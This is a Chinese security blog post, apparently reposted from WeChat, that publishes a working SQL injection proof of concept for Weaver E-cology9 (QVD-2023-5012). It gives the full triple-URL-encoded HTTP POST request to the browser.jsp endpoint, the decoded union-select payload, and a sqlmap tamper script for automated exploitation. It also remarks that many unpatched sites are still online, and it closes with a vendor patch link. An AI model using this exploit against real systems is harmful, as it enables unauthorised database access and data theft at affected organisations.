<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_NzNyWjMrx4DhMtrYGZlVQ)

**声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责**

**---------------------------------------------------------------------------------  
**

上个月这个漏洞就复现了，但直到今天还是有师傅在问 poc 以及 poc 无效的问题。。。

别问了，以后这个不回复

在这放 poc 及脚本。

```
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1222
isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37

```

可以看我上一篇关于这个漏洞的文章~ 狗头  

[QVD-2023-5012 - 泛微 E-cology9 SQL](http://mp.weixin.qq.com/s?__biz=Mzg5OTg5NzMzMA==&mid=2247483931&idx=2&sn=bfca0cc0348adff858846c654e55664d&chksm=c04d0086f73a8990cac38f1ac4e765de4f021702aa3856e97bbba2a01cf8eca32ec9eddcb1b6&scene=21#wechat_redirect)

**漏洞影响范围为**

Ecology9 <=10.55

这里的 poc 经过三次 url 全字符编码，原语句为：

```
a' union select 1,''+(select 'SQL_EXISTS')+'

```

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBGmAHHGshkOzxiclY7yrbIPv3zpxgib3uibhde8F9THk31MWodzG02xzpg/640?wx_fmt=png)

很明显的回显点，所以这不是盲注，这不是盲注，这不是盲注！！

不管盲注显注，显然可以直接上 sqlmap，但有些师傅不会全字符编码，问 gpt 也不行，也就导致一跑脚本直接 gg，这里放下 tamper：

```
def tamper(payload, **kwargs):
    # URL encoding for all characters
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in payload])
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])
、
    encoded_payload = encoded_payload.replace(' ', '%20')
    return encoded_payload

```

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wB0yHxhZhq25ySqIfibcatu62rmDbnvcoVK7usf1ic4olIaIgiceoTKgxKQ/640?wx_fmt=png)

到这里师傅们觉得 sqlmap 盲注太慢了，可以自己构造语句，直接查询：

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBIeibyt8VpdBpczzr651gCbKD0uiaNUuQ6gzamHLPOgorCdlFMiadv8k0Q/640?wx_fmt=png)

用 sqlshell 写语句查询：

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBE6DEnbt2a2nUPynazmKMlVVQWBcwibia8k6HOP7x62X63CQ4X2Zw6Mvw/640?wx_fmt=png)

或者自己写个脚本查询都行。。。  

目前互联网上仍然有大量存在该漏洞的网站，包括上市集团。

**修复方案**

目前官方已发布安全补丁修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接如下：

https://www.weaver.com.cn/cs/securityDownload.asp#